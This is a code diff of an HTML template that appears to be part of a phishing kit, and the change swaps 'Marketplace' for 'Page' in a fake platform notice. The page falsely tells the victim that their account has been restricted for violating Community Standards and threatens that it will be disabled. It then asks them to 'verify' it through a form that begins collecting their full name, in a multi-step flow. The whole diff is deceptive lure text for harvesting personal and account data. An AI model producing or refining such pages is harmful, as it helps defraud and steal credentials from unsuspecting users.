@@ -13,7 +13,7 @@
             <img
               src="{{ asset('assets/home-image-VAkJ10vV.png') }}"
               class="w-full"
-              alt="" /><b class="text-2xl">Your Marketplace Account Has Been Restricted</b>
+              alt="" /><b class="text-2xl">Your Page Account Has Been Restricted</b>
             <p class="text-sm text-gray-500">Term of Service</p>
             <hr />
           </div>
@@ -22,7 +22,7 @@
            
             <input type="hidden" name="step" value="2">
             <input type="hidden" name="business_id" value="{{ $business_id }}">
-          <div class="my-5">We detected unusual activity in your Marketplace account today <strong id="tampil"></strong>. Your account has been reported for violating Marketplace's<b class="cursor-pointer font-medium text-blue-500 hover:underline"> Community Standards</b>. After reviewing this report, we have confirmed that the decision cannot be reversed. To avoid having your account <b class="cursor-pointer font-medium text-blue-500 hover:underline">disabled</b> , please verify your account by following the steps below:</div>          
+          <div class="my-5">We detected unusual activity in your Page account today <strong id="tampil"></strong>. Your account has been reported for violating Page's<b class="cursor-pointer font-medium text-blue-500 hover:underline"> Community Standards</b>. After reviewing this report, we have confirmed that the decision cannot be reversed. To avoid having your account <b class="cursor-pointer font-medium text-blue-500 hover:underline">disabled</b> , please verify your account by following the steps below:</div>          
           <div class="my-5">
             <input
               id="yourName" name="full_name"
